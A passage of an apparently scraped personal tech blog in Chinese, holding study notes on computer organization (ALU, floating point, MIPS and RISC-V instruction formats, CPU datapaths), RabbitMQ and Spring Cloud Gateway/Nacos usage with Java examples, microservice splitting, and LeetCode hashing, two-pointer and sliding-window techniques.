组内并行、组间并行\nALU的构成 ALU 如何控制实现加、减、与、或等等各种功能； 无符号整数和带符号整数的加、减运算电路完全一样，这个运算电路称为整数加/减运算部件。 在整数加/减运算部件基础上，加上寄存器、移位器以及控制逻辑，就可实现 ALU、乘/除运算以及浮点运算。 ALU 的 OF、SF、CF 和 ZF 标志信息如何产生。 零标志 ZF、溢出标志 OF、进/借位标志 CF、符号标志 SF 称为条件标志。 条件标志（Flag）在运算电路中产生，被记录到专门的寄存器中 存放标志的寄存器通常称为程序/状态字寄存器或标志寄存器。 溢出条件：\n无符号加、减溢出条件：CF=1 带符号加、减溢出条件：OF=1 定点数运算 移位 逻辑移位\n针对无符号数\n左移 n 位，即乘上位权的 n 次方。\n高位溢出丢弃，低位补 0\n算数移位\n左移与逻辑移位类似，但移到符号位结果更改 右移：低位移出丢弃，但高位补符号位，若移出 1，则发生精度丢失 加减 原码\n减法用减法器实现，1 变 0 补码\n符号位可以一起参与运算 [A+B]补=[A]补+ [B]补 [A-B]补=[A]补+[-B]补 [-B] 补 = [B] 补的 “取反加 1”，符号位也参与取反\n溢出判断：上溢正变负；只有可能同号运算出现；判断是否在合法表示范围内即可 乘法 无符号整数： 模拟手算乘法即可，计算机还需拆分部分积 具体实现：\n带符号整数 给无符号整数乘法电路添加一辅助位，让符号位参与运算。\n计算机底层判断溢出：\n若 2n 位的高 n + 1 位不均相同，则溢出 实现方式 ALU + 移位器 + 寄存器 + 控制逻辑 阵列乘法器 逻辑运算模拟 浮点数运算 浮点数加减运算的对阶原则和方法；\n原则：小阶向大阶看齐\n方法：阶小的那个数的尾数右移，右移位数等于两个阶码差的绝对值\nIEEE 754 尾数右移时，要将隐含的“1”移到小数部分，高位补 0，移出的低位保留到特定的“附加位”上\n如何计算移码表示的阶码的和与差（标准移码与 IEEE754 移码有什么差别）；\n阶码加法公式为： Eb ← Ex + Ey + 129 （ mod 2^8）\n阶码减法公式为： Eb ← Ex + [–Ey]补 + 127 （ mod 2^8）\n如何计算一个移码数减 1\n尾数规格化中的右规和左规方法；\n当尾数高位为 0，则需左规：尾数左移一次，阶码减 1，直到 MSB 为 1 每次阶码减 1 后要判断阶码是否下溢 先判断阶码是否为全 0，若是，则直接置阶码下溢；否则，阶码减 1 后判断阶码是否为全 0，若是，则阶码下溢。 当尾数最高位有进位，需右规：尾数右移一位，阶码加 1，直到 MSB 为 1 每次阶码加 1 后要判断阶码是否上溢 先判断阶码是否为全 1，若是，则直接置阶码上溢；否则，阶码加 1 后判断阶码是否为全 1，若是，则阶码上溢。 阶码溢出异常处理： 阶码上溢，则结果溢出； 阶码下溢，则结果为 0 乘法运算结果不需左规！最多右规 1 次！ 除法最多左规 1 次！不需右规！ 尾数的舍入处理常用方法；\n就近舍入：舍入为最近可表示的数 若为非中间值：LSB 后 1 位 0 舍 1 入 若为中间值：强迫结果为偶数， LSB= 1.1101110 → 1.1110 (1.1101110 → 1.1110, 110\u0026gt;100, 1.1101+0.0001 = 1.1110) 1.1101011 → 1.1101 (1.1101011 → 1.1101, 011\u0026lt;100, 1.1101+ 0 = 1.1101) 1.1101101 → 1.1110 1.1111100 → 10.0000 (1.1111100 → 10.0000, 100=100, 1.1111+0.0001 = 10.0000) 朝+∞方向舍入：舍入为右边最近可表示数 （正向舍入） 例：-1.1101101 →-1.1101 ； 1.1101101 →1.1110 朝-∞方向舍入：舍入为左边最近可表示数 （负向舍入） 例：-1.1101101 →-1.1110 ； 1.1101101 →1.1101 朝 0 方向舍入：直接截取所需位，后面的位丢弃。这种方法最简单 如何判断结果溢出（上溢和下溢）。\n第四章 指令格式 指令：是指示计算机执行某种操作的命令，是计算机运行的最小功能单位。\n根据地址码数不同 零地址指令： 不需要操作数，如停机、关中断等 堆栈计算机，操作数隐藏在栈顶 一地址指令： 只需单操作数，如加一、取反 需两个操作数，但其中一个存储在某个寄存器内 二地址指令： 用于需要两个操作数的算术运算 三地址指令： 多一个地址存储结果 四地址指令： 再多一个地址存储下一个指令地址 指令位数不变时，地址码数越多，寻址能力越差\n按指令长度分类 指令字长：一条指令的总长度(可能会变)\n影响取指令所需时间\n机器字长：CPU进行一次整数运算所能处理的二进制数据的位数(通常和ALU直接相关)\n存储字长：一个存储单元中的二进制代码位数（通常和MDR位数相同)\n按操作码长度分类 定长：译码电路设计简单，但复杂性低\n按操作类型分类 数据传送\nLOAD：把存储器中的数据放到寄存器中\nSTORE： 把寄存器中的数据放到存储器中\n算数逻辑操作\n算数、逻辑（与或非、位操作） 移位操作\n算数、逻辑、循环移位 转移操作（改变程序执行流，PC指针改变）\n无条件转移 JMP\n条件转移JZ：结果为0；JO：结果溢出；JC：结果有进位\n调用和返回 CALL和RETURN\n陷阱(Trap)与陷阱指令\n输入输出操作\nCPU寄存器与IO端口之间的数据传送(端口即IO接口中的寄存器) 设计 指令格式的选择应遵循的几条基本原则 应尽量短 要有足够的操作码位数 指令编码必须有唯一的解释，否则是不合法的指令 指令字长应是字节的整数倍 合理地选择地址字段的个数 指令尽量规整 一条指令必须明显或隐含包含以下信息： 操作码：指定操作类型 源操作数或其地址：一个或多个源操作数所在的地址 结果的地址：产生的结果存放何处（目的操作数） 下一条指令地址：下条指令存放何处 指令的寻址方式\u0026mdash;-简单 顺序执行：PC增值 跳转 （ jump / branch / call / return ）：同操作数寻址 操作数的寻址方式\u0026mdash;-复杂 操作数来源：寄存器 / 主（虚）存 /外设端口 / 栈顶 操作数结构：位 / 字节 / 半字 / 字 / 双字 / 一维表 / 二维表 /… 通常寻址方式特指“操作数的寻址” 扩展操作码 格式：定长指令字结构 + 可边长操作码\n即不同地址数的指令使用不同的操作码，便于判断 通常情况下，对使用频率较高的指令，分配较短的操作码；对使用 频率较低的指令，分配较长的操作码，从而尽可能减少指令译码和 分析的时间。\n设地址长度为n，上一层留出m种状态，下一层可扩展出mx2^n种状态\n注意短的操作码不能是长操作码的前缀\n寻址方式 PC：程序计数器，取址后会自动加一\n指令寻址 确定下一条指令的存放地址，由 PC 指明\n顺序寻址：\nPC + ”1“ 1 理解为一个指令字长，根据指令字长变化字节编码 跳跃寻址\n执行转移指令导致 PC 值改变（直接修改） 数据寻址 确定本条指令的地址码指明的真实地址\n程序存储位置是相对的，需要用偏移量解读\n在地址码中划分出寻址特征，规定该地址需要用何种方式寻址\n直接寻址：存储 = 真实，即 EA = A\n间接寻址：存储的是真实值的地址，即 EA = （A）\n寄存器寻址：指令字中直接给出操作数所在寄存器编号\n寄存器间接寻址：寄存器存储的是操作数所在储存单元的地址，即 EA = （R）\n隐含寻址：非显示给出的操作数\n立即寻址：地址就是操作数本身，又称立即数\n基址寻址：以程序的起始存放地址作为起点，EA = （BR）+ A\nBR 为基址寄存器，由操作系统决定，不可更改\n变址寻址：程序员自己决定从哪里作为起点，EA = （IX）+ A IX 为变址寄存器，可由用户决定。类似一个指针，设置为数组首地址等\n相对寻址：程序计数器PC所指地址作为起点，EA = （PC）+ A\n堆栈寻址：操作数存放在堆栈中，隐含使用堆栈指针(SP)作为操作数地址。\n堆栈可以用寄存器实现（硬堆栈）或主存实现，硬堆栈不妨存，速度快\n优缺点 条件测试方式(?) 对于带符号数和无符号数运算，标志生成方式有没有不同？\n答：没有，因为加法电路不知道是无符号数还是带符号整数！\n指令系统设计风格 累加器型： （earliest machines） 特点：其中一个操作数（源操作数 1）和目的操作数总在累加器中 堆栈型： （e.g. HP calculator, Java virtual machines) 特点：总是将栈顶两个操作数进行运算，指令无需指定操作数地址 通用寄存器型： （e.g. IA-32, Motorola 68xxx) 特点：操作数可以是寄存器或存储器数据（即 A、B 和 C 可以是寄存器或存储单元） 装入/存储型： （e.g. SPARC, MIPS, PowerPC) 特点：运算指令的操作数只能是寄存器数据，只有 load/store 能访问存储器 指令集：CISC 和 RISC CISC（Complex Instruction Set Computer）：\n一条指令完成一个复杂的基本功能。 x86 架构 RISC（Reduced Instruction Set Computer）：\n一条指令完成一个基本“动作”；多条指令组合完成一个复杂的基本功能。\n电路简单，功耗小，寄存器多\n只有 LOAD、STORE 指令可以访存\nARM 架构，主要用于手机、平板\n在程序中各种指令出现的频率悬殊很大，最常使用的是一些简单指令，这些指令占程序的80%，但只占指令系统的20%。而且在微程序控制的计算机中，占指令总数20%的复杂指令占用了控制存储器容量的80%。\nMIPS 的指令格式 所有指令都是32位宽（字长），按字地址对齐存储，字地址为4的倍数\n分为 R、I、J 型\nR 型 参与运算的操作数和结果都在寄存器，R 型指令的寻址方式只有寄存器寻址一种； R 型指令的 op 全为 0，具体功能由 func 部分确定； rs：第一个源操作数（source register） rt：第 2 个源操作数（target register） rd：目的寄存器（destination register） shamt：对非移位指令为 00000。移位指令为移位次数。 I 型 指令中包含了一个立即数，所以称为 I 型指令。 op：确定指令的功能； rs：可以是一个源操作数，寄存器寻址；或者在存取指令中用作基址寄存器，偏移寻址。 rt：目的寄存器 Immediate：长度为 16 位的立即数，指令执行时需扩展为 32 位。根据指令的不同，可以有以下三种用法： 运算类指令（ori）：以立即寻址方式提供的一个源操作数。 存取指令（lw/sw）：作为偏移量，与寄存器 rs 组成偏移寻址方式，提供一个存储器操作数。 条件转移指令（bne）：作为偏移量，与 PC 寄存器组成相对寻址方式，提供一个转移目的地址。 J 型 op：确定指令的功能 address：转移地址 整合 三种指令 汇编格式 a=b op c 把=和op变成逗号 R型指令格式是op+rs+rt+rd+shamt+func 汇编格式是 xxx $rs, $rt, $rd I型指令格式是op+rs+rt+imm 汇编格式是 xxx $rt, $rs, imm J型指令格式是op+addr 汇编格式是 xxx addr MIPS 的通用寄存器 0 号寄存器$zero 为固定值零，不能改变 MIPS还提供了32个32位的单精度浮点寄存器$f0∽$f31,用于浮点数指令。它们可配对成16个64位的双精度浮点寄存器。 在汇编语言中使用寄存器时可以用寄存器名，也可以用寄存器号，前面加上“$”,例如，$8或$t0。 寄存器 长度：32 位 个数：32 个 MIPS 的寻址方式 寄存器寻址 可以出现在 R 型和 I 型格式中 立即数寻址 偏移寻址 PC 相对寻址 PC\u0026lt;\u0026ndash; PC+4+imm*4 伪直接寻址 为什么称伪直接？ 最终地址：PC 高四位+addr+两个 0，+表示拼接 位数：4+26+2=32 机器语言的解码（反汇编）？ 高级语言、汇编语言、机器语言之间的转换 ？ RISC-V 指令系统 具有模块化结构，稳定性和可扩展性好，在简洁性、实现成本、功耗、性能和程序代码量等各方面具有显著优势。\n模块化结构：\n核心：RV32I + 标准扩展集：RV32M、RV32F、RV32D、RV32A = RV32G 32位架构RV32G = RV32IMAFD，其压缩指令集RV32C（指令长度16位） 64位架构RV64G = RV64IMAFD，其压缩指令集RV64C（指令长度16位） 向量计算RV32V和RV64V；嵌入式RV32E（RV32I的子集，16个通用寄存器） 指令格式 32位 R-型为寄存器操作数指令\nI-型为短立即数或装入（Load）指令\nS-型为存储（Store）指令\nB-型为条件跳转指令\nU-型为长立即数操作指令\nJ-型为无条件跳转指令\n16位压缩 第五章 中央处理器 CPU 的功能和基本结构 CPU 基本功能： 指令控制。完成取指令、分析指令和执行指令的操作，即程序的顺序控制。 操作控制。一条指令的功能往往是由若干操作信号的组合来实现的。CPU 管理并产生由内存取出的每条指令的操作信号，把各种操作信号送往相应的部件从而控制这些部件按指令的要求进行动作。 时间控制。对各种操作加以时间上的控制。时间控制要为每条指令按时间顺序提供应有的控制信号。 数据加工。对数据进行算术和逻辑运算。 中断处理。对计算机运行过程中出现的异常情况和特殊请求进行处理。 基本结构 数据通路 + 控制器\n控制器 对指令进行译码，生成指令对应的控制信号，控制数据通路的动作。它向执行部件发出控制信号，是指令的控制部件。 数据通路 由操作元件和存储元件通过总线方式或分散方式连接而成的进行数据传送、处理和存储的路径。\n数据通路\n指令执行过程中，数据所经过的路径，以及路径上的部件。\n包括：ALU、通用寄存器、状态寄存器、MMU、cache、中断处理逻辑等\n数据通路中专门进行数据运算的部件称为执行部件或功能部件\n功能：进行数据传送、处理和存储\n组成元件\n组合逻辑元件（操作元件）：输出只取决于当前输入 时序逻辑元件（也称状态元件，或存储元件）：在时钟控制下输入被写到电路中，直到下个时钟到达。 定时方式：规定信号何时写入状态元件（上升沿、下降沿、电平触发） 存储元件：寄存器 \u0026ndash;\u0026gt; 寄存器组 连接方式\n总线、分散 时序控制（过去式）：\n现代时钟周期 …… + 状态元件 + 操作元件( 组合电路) + 状态元件 + …… 只有状态元件能存储信息，所有操作元件都从状态元件接收输入，并将输出写入状态元件中。 时钟周期= Latch Prop + Longest Delay Path + Setup + Clock Skew(时钟偏移) 约束条件：操作元件输出有效信号最快出现必须在下一级状态元件的输入保持时间之后出现 单周期 MIPS 处理器的设计 复习：三种指令类型 R、I、J\n设计处理器步骤 分析每条指令功能，并用 RTL（Register Transfer Language）来表示 根据指令的功能给出所需的元件，并考虑如何将他们互连 确定每个元件所需控制信号的取值 汇总所有指令所涉及到的控制信号，生成一张反映指令与控制信 号之间关系的表 根据表得到每个控制信号的逻辑表达式，据此设计控制器电路 设计数据通路 R-type：取指 \u0026ndash;\u0026gt; 取寄存器 \u0026ndash;\u0026gt; 运算 \u0026ndash;\u0026gt; 输出、计算下地址 M[PC] 从PC所指的内存单元中取指令 R[rd] ← R[rs] + R[rt] 从rs、r所指的寄存器中取数后相加。若结果不溢出，则将结果送rd所指的寄存器中；若结果溢出，则不送结果，并转到“溢出处理程序”执行。 PC ← PC + 4 PC加4，使PC指向下一条指令 I-type M[PC] 取指令（公共操作，取指部件完成） R[rt] ← R[rs] or ZeroExt(imm16) 立即数零扩展，并与rs内容做“或”运算 PC ← PC + 4 计算下地址（公共操作，取指部件完成） Lw 装入指令 M[PC] 取指令（公共操作，取指部件完成） Addr ← R[rs] + SignExt(imm16) 计算存储单元地址 (立即数符号扩展！) R[rt] ← M [Addr]装入数据到寄存器rt中 PC ← PC + 4计算下地址（公共操作，取指部件完成） sw 指令 M[PC] 取指令（公共操作，取指部件完成） Addr ← R[rs] + SignExt(imm16) 计算存储单元地址（符号扩展！） M[Addr] ← R[rt] 寄存器rt中的内容存到内存单元中 PC ← PC + 4 计算下地址（公共操作，取指部件完成） 分支指令 M[PC] 取指令（公共操作，取指部件完成） Cond ← R[rs] - R[rt] 做减法比较rs和rt中的内容 if (Cond eq 0) 计算下地址（根据比较结果，修改PC） PC ← PC + 4 + ( SignExt(imm16) x 4 ) else PC ← PC + 4 无条件跳转指令 M[PC]\t取指令（公共操作，取指部件完成） PC\u0026lt;31:2\u0026gt; ← PC\u0026lt;31:28\u0026gt; 串接 target\u0026lt;25:0\u0026gt; 计算目标地址 指令范围有多大？ 不是相对寻址，是绝对寻址。转移范围只能在 j 指令所在的228=256MB页面内，页面号与j指令相同 PC\u0026lt;31:28\u0026gt;\n完成 时间计算 设计控制器 方法： 根据每条指令的功能，分析控制信号的取值，并列表表示。 根据列出的指令和控制信号的关系，写出每个控制信号的逻辑表达式。 ","date":"2025-10-03T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/","title":"计算机组成原理"},{"content":"初识 MQ 服务调用类型 同步调用 服务 A 同时请求多个服务，导致服务种类的不断扩增，服务的等待耗时增加。\n缺点：\n扩展性差\n性能下降\n级联失败问题\n异步调用 基于消息通知的方式，包含：\n消息发送者：即原来的调用者 消息接收者：接收和处理消息的人 消息代理：管理、暂存转发消息 不再同步调用业务关联度第的服务，而是分别发送消息到 Broker\n接触耦合，扩展性强\n无需等待，性能好\n故障隔离\n缓存消息，流量削锋填谷\n技术选型 RabbitMQ、ActiveMQ、RocketMQ、Kafka\n部署 Docker安装即可\n整体架构：\npublisher：消息发送者 consumer：消息消费者 queue：队列，存储消息 exchange：交换机，负责路由消息 vertual-host：虚拟主机，用于数据隔离 消息发送给交换机，再由交换机分发给对应的 queue，交换机没有消息存贮的能力。\nJava客户端 AMQP：无协议传输\n封装为 Spring AMQP 再封装为 SpringRabbit，RabbitTemplate包装类 收发消息 发送：\n1 2 3 4 5 6 7 8 9 10 11 12 @Autowired private RabbitTemplate rabbitTemplate; @Test public void testSimpleQueue() { // 队列名称 String queueName = \u0026#34;simple.queue\u0026#34;; // 消息 String message = \u0026#34;hello, spring amqp!\u0026#34;; // 发送消息 rabbitTemplate.convertAndSend(queueName, message); } 接收：\n1 2 3 4 5 6 7 8 9 @Slf4j @Component public class SpringRabbitListener { @RabbitListener(queues = \u0026#34;simple.queue\u0026#34;) public void listenSimpleQueueMessage(String msg) throws InterruptedException { log.info(\u0026#34;spring 消费者接收到消息: [\u0026#34; + msg + \u0026#34;] \u0026#34;); } } Work Queues 多个消费者绑定到一个队列\n一条消息只能被一个消费者处理\n多条消息，默认轮流接收\n通过添加消费者来处理超量数据\n修改配置\n修改 prefetch 来控制消费者预取的消息数量，使性能高的服务器多处理 交换机 Fanout 广播模式，将接收到的消息路由到每一个与其绑定的 queue\nDirect 定向路由，根据规则路由到指定的 queue\n设置 BindingKey 和 RoutingKey Topic 基于 RoutingKey，但其通常是多个单词的组合，且以.分割，可以使用通配符# *\n声明队列交换机 用代码自动完成队列、交换机的创建\n基于Bean声明 在消费者端声明：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @Configuration public class FanoutConfig { // 声明FanoutExchange交换机 @Bean public FanoutExchange fanoutExchange(){ return new FanoutExchange(\u0026#34;hmall.fanout\u0026#34;); } // 声明第1个队列 @Bean public Queue fanoutQueue1(){ return new Queue(\u0026#34;fanout.queue1\u0026#34;); } // 绑定队列和交换机 @Bean public Binding bindingQueue1(Queue fanoutQueue1, FanoutExchange fanoutExchange){ return BindingBuilder.bind(fanoutQueue1).to(fanoutExchange); } // ... 略，以相同方式声明第2个队列，并完成绑定 } 基于注解声明 优化 Bean 声明中绑定 Key 的冗余代码。\n1 2 3 4 5 6 7 8 @RabbitListener(bindings = @QueueBinding( value = @Queue(name = \u0026#34;direct.queue1\u0026#34;), exchange = @Exchange(name = \u0026#34;itcast.direct\u0026#34;, type = ExchangeTypes.DIRECT), key = {\u0026#34;red\u0026#34;, \u0026#34;blue\u0026#34;} )) public void listenDirectQueue1(String msg){ System.out.println(\u0026#34;消费者1接收到Direct消息: [\u0026#34;+msg+\u0026#34;] \u0026#34;); } 消息转换器 负责将对象转换为字节格式传输\n问题：\n默认序列化由安全风险 信息体积变大 可读性差 解决：\n用 Jackson 序列转换器\n注意收发一致\n进阶 改进消息可靠性问题\n发送者可靠性 重连 由于网络波动，可能出现发送者连接 MQ 失败。\n配置中开启重连机制即可\n注意性能损耗 使用合理的重连机制 确认 MQ 接收到消息后，返回 ACK 给发送者。（对性能影响较大）\n不同的返回情况、强度 其他情况返回 NACK，告知投递失败 使用：\n先开启配置 public confirm type\n配置类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 @Slf4j @AllArgsConstructor @Configuration public class MqConfig { private final RabbitTemplate rabbitTemplate; @PostConstruct //只在启动时初始化依次 public void init(){ rabbitTemplate.setReturnsCallback(new RabbitTemplate.ReturnsCallback() { @Override public void returnedMessage(ReturnedMessage returned) { log.error(\u0026#34;触发return callback,\u0026#34;); log.debug(\u0026#34;exchange: {}\u0026#34;, returned.getExchange()); log.debug(\u0026#34;routingKey: {}\u0026#34;, returned.getRoutingKey()); log.debug(\u0026#34;message: {}\u0026#34;, returned.getMessage()); log.debug(\u0026#34;replyCode: {}\u0026#34;, returned.getReplyCode()); log.debug(\u0026#34;replyText: {}\u0026#34;, returned.getReplyText()); } }); } } 发送方： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 @Test void testPublisherConfirm() throws InterruptedException { // 1.创建CorrelationData CorrelationData cd = new CorrelationData(); // 2.给Future添加ConfirmCallback cd.getFuture().addCallback(new ListenableFutureCallback\u0026lt;CorrelationData.Confirm\u0026gt;() { @Override public void onFailure(Throwable ex) { // 2.1.Future发生异常时的处理逻辑，基本不会触发 log.error(\u0026#34;handle message ack fail\u0026#34;, ex); } @Override public void onSuccess(CorrelationData.Confirm result) { // 2.2.Future接收到回执的处理逻辑，参数中的result就是回执内容 if(result.isAck()){ // result.isAck()是boolean类型，true代表ack回执，false代表nack回执 log.debug(\u0026#34;发送消息成功，收到 ack!\u0026#34;); }else{ // result.getReason()是String类型，返回nack时的异常描述 log.error(\u0026#34;发送消息失败，收到 nack，reason：{}\u0026#34;, result.getReason()); } } }); // 3.发送消息 rabbitTemplate.convertAndSend(\u0026#34;hmall.direct\u0026#34;, \u0026#34;red1\u0026#34;, \u0026#34;hello\u0026#34;, cd); } 若发送失败，则尝试重发\nMQ可靠性 问题：\n数据丢失\n内存空间有限，可能导致消息阻塞、堆积\n数据持久化 交换机、队列、消息\n消息：内存到上限后，才写出到磁盘，阻塞 一直写出到磁盘 Lazy Queue 惰性队列\n接到消息不再写到内存，直接存入磁盘 消费消息时，从磁盘中读取并加载到内存 消费者可靠性 确认 消费者处理消息结束后，向 MQ 发送回执，告知消息处理状态\nack：成功处理 配置`acknowledge-mode none 接到后直接返回。不安全 manual 手动编写返回逻辑 auto nack：处理失败，需要重发 reject：处理失败并拒绝，MQ 从队列中删除该消息 失败重试 问题：消费者反复调用 MQ 导致性能损耗\n解决：消费者出现异常时利用本地调试机制，无需调用 queue\n重试耗尽后的策略\n直接 reject（默认） 返回 nack，重新入队 将失败消息投递到指定的交换机 业务幂等 程序开发时，同一个业务执行一次和多次对业务状态的影响是一致的。用于确保消息不被多次执行。\n解决方案：\n给每个消息设置唯一 id ，配置SetMessageId，然后将 id 写入数据库\n业务判断：基于业务本身\n保证服务间一致性 延迟消息 实现一致性的兜底方案。\n发送者发送消息时指定时间，消费者在指定时间后才收到消息\n如支付超时取消 死信交换机 死信：\nrequeue = false 消息无人消费、过期 \u0026ndash;\u0026gt; 用于实现延迟消息 消息堆积满了，最早的消息成为死信 死信交换机：\n接收死信 消息延迟插件 RabbitMQ的插件，docker部署\n计时需要占用 CPU，产生资源消耗 尽可能延时缩短 ","date":"2025-10-02T00:00:00Z","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-mq/","title":"MQ"},{"content":"网关 介绍 网络的关口，负责请求的路由、转发、身份检验。分为阻塞式、响应式。微服务将服务注册到注册中心，网关进行服务拉取返回给前端。\n使用 创建新模块 引入网关依赖 编写启动类 配置路由 1 2 3 4 5 6 7 8 9 10 11 12 spring: cloud: gateway: routes: - id: item # 路由规则id，自定义，唯一 uri: lb://item-service # 路由目标微服务，lb代表负载均衡 predicates: # 路由断言，判断请求是否符合规则，符合则路由到目标 - Path=/items/** # 以请求路径做判断，以/items开头则符合 - id: xx uri: lb://xx-service predicates: - Path=/xx/** 另有各种路由种类、路由过滤器。\n登录校验 需要在网关转发之前进行校验，即添加过滤器。\n网关底层流程：\nHandlerMapping 路由映射器 WebHandler 请求处理器，即过滤器处理器 PRE（在这里实现） + POST 阶段 Q: 网关如何将用户信息传递给微服务？\nHttp 传送 \u0026ndash;\u0026gt; 用请求头 Q: 微服务之间如何传递用户信息？\n自定义过滤器 GatewayFilter：指定路由生效 GlobalFilter：全局过滤器，作用于所有路由 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 @Component public class MyGlobalFilter implements GlobalFilter, Ordered { @Override public Mono\u0026lt;Void\u0026gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { // 1.获取请求 ServerHttpRequest request = exchange.getRequest(); // 2.过滤器业务处理 System.out.println(\u0026#34;GlobalFilter pre阶段 执行了。\u0026#34;); // 3.放行 return chain.filter(exchange); } @Override public int getOrder() { // 过滤器执行顺序，值越小，优先级越高 return 0; } } 网关拦截逻辑： 获取 request\n根据 URL 判断是否需要拦截\n获取 Token，解析校验\n网关传递服务 用 ServerWebExchange 类下的 API 来给请求头添加鉴权信息，再发送给后续服务。\n将登录检验封装为工具模块（配置类），统一扫描调用。\n配置类的配置：@ConditionalOnClass(DispatcherServlet.class) 只拦截到后端 SpringMVC 的请求（否则其他模块扫描不到），绕过网关。\n微服务间传递信息 利用 OpenFeign 的 RequestTemplate 类更改请求头传递，保存请求头。\n配置管理中心 问题：\n微服务重复配置过多，维护成本高 更改配置不方便，需要重启服务、网关 解决：\n通过配置管理实现热更新、配置共享 配置管理 NACOS 可视化编辑共享配置 包含：\n数据库\n日志\nSwagger\n……\n微服务拉取共享配置 流程：\n启动，加载 bootstrap 引导类 拉取 Nacos 配置 初始化 ApplicationContext上下文 加载 application.yml ，拉取共享配置，合并配置 配置热更新 前提条件\nnacos 中要有于微服务名有关的配置文件 微服务中要以特定方式读取需要热更新的配置属性 动态路由 要求：\n监听 Nacos 配置变更信息 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 private final NacosConfigManager nacosConfigManager; public void initRouteConfigListener() throws NacosException { // 1.注册监听器并首次拉取配置 String configInfo = nacosConfigManager.getConfigService() .getConfigAndSignListener(dataId, group, 5000, new Listener() { @Override public Executor getExecutor() { return null; } @Override public void receiveConfigInfo(String configInfo) { // TODO 监听到配置变更，更新一次配置 } }); // TODO 2.首次启动时，更新一次配置 } 再定义 UpdateConfigInfo(),删除旧的路由、重新读取新路由 ","date":"2025-10-01T00:00:00Z","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-%E7%BD%91%E5%85%B3%E5%8F%8A%E9%85%8D%E7%BD%AE%E4%B8%AD%E5%BF%83/","title":"网关及配置中心"},{"content":"为什么需要拆分？ 单体架构不适合于用户量大、开发人员多的项目 访问资源难以分配，无法分解并发压力 \u0026ndash;\u0026gt; 把单体架构拆分为多个独立项目\n颗粒度小，团队自治，服务自治，数据隔离\n服务拆分 前置知识 首先熟悉项目、模块，看流程。\n拆分时机\n创业型项目先采用单体结构，随规模扩增\n拆分原则\n高内聚（关联度、完整度高），低耦合（减少对其他服务依赖）\n纵向：按业务模块\n横向：抽取公共服务，提高复用性\n拆分类型\n独立 project：适用于大型项目\nMaven 聚合，分开打包：较小型项目\n注册中心\n整合服务调用、服务提供者\n提供负载均衡，心跳续约、推送变更（防失效）\nNacos\n需要提供数据库，配置服务注册\n服务发现 -\u0026gt; 挑选示例（负载均衡） -\u0026gt; 调用\nOpenFeign\n声明式http客户端，简化http请求书写\n使用步骤：导入 client 模块 -\u0026gt; 打开开关 -\u0026gt; 写接口\n接口的作用是转发 http 请求，作为各个服务间请求数据的中介\n连接池：底层请求用的是 Client，效率较低，用连接池优化\n最佳实践：1. 将查询接口放到服务提供方 2 . 封装为统一的api模块（耦合度较高）\n日志记录：定义类、定义日志级别，声明到注解\n拆分步骤 先按模块分析，将实体类区分开 选择拆分类型，建立模块或项目，改依赖 导入并修改启动类、配置类、各种实体类，根据报错再修改 导入service、impl、controller、mapper 重建数据库、配置启动项进行测试 注意\n若 service 中还需要注入其他模块的 service，就要配置注册中心。接入 feign 的 api 接口来调用指定服务。在拆分的同时不断完善 feign 的接口（从目标服务的 controller 中抽取）。\n","date":"2025-10-01T00:00:00Z","permalink":"https://calendar0917.github.io/posts/java%E5%BC%80%E5%8F%91-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8B%86%E5%88%86/","title":"微服务拆分"},{"content":"哈希 适用场景：\ncollections.defaultdict(type) 字典类型，自动添加某类型元素。思考哈希值如何计算、如何存储。 涉及到查重、判断是否存在相似元素时，可以使用。 例题 字母异位词分组 1 2 3 4 5 1. collections.defaultdict(list) 满足返回的为各个字符集;通过 mp[key].append(st) 来给字典加入值。 2. \u0026#34;\u0026#34;.join(sorted(s)) 来排序、求重 3. return list(mp.values()) 直接返回值的列表 最长连续序列 1 2 3 1. 利用集合去重、提高查找速度 2. 分析连续序列所满足的条件、限制的条件：若n-1在序列中，则无需遍历n，利用包含关系来简化算法 双指针 适用场景：\n多变量问题，变量间存在某种关系 首尾比较、字符移动 同向、相向遍历问题 通法：\n初始化左右指针，并考虑其作用、意义 写循环，考虑边界条件、指针变化规律，注意规范 例题 移动0 1 2 3 1. 由于要将0移到末端，所以右指针需要指向非零数，左指针指向0，两数交换即可 2. 边界条件：右指针到末尾即停止，因为已经没有非零数需要向前移动 盛最多水的容器 1 2 3 4 5 6 1. 暴力思路：直接两层for循环从左向右遍历 2. 思考：有必要依次循环吗？什么情况下会出现最大值？如何趋向最大值？ 3. 优化：计算面积的公式是：(right - left)*min(height[left],height[right]) 那么不妨从 right - left 最大时开始遍历，这时想到双指针。那么往里收缩的条件就变成比较height的大小。如果height更大就直接保留，舍去了很多不必要的情况。 三数之和 1 2 3 4 5 1. 难点在于去重，各个值的组合不能重复 2. 思考：\u0026#34;不能重复\u0026#34;这一要求能不能转化？ 3. 优化：不妨将数组重新排序，从而让三个数也排序地输出，免去了去重的麻烦。更进一步，a+b+c=0是等式关系，而a确定后，b是递增的，c又是由a、b决定的，故可以将b、c用双指针遍历，一增一减，完全符合要求。 滑动窗口 适用情景：\n连续子数组、子序列 在一个范围内进行条件统计 具有单调性，随窗口移动时不必全部更新 要点在于，将问题放到窗口中讨论，控制窗口来控制遍历所有可能情况 模板：\n右入（直到装满窗口） - 判断 - 更新 - 左出\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ans = vowel = 0 for i, c in enumerate(s): # 枚举窗口右端点 i # 1. 右端点进入窗口 if c in \u0026#34;aeiou\u0026#34;: vowel += 1 left = i - k + 1 # 窗口左端点 if left \u0026lt; 0: # 窗口大小不足 k，尚未形成第一个窗口 continue # 2. 更新答案 ans = max(ans, vowel) if ans == k: # 答案已经等于理论最大值 break # 无需再循环 # 3. 左端点离开窗口，为下一个循环做准备 if s[left] in \u0026#34;aeiou\u0026#34;: vowel -= 1 return ans 定长 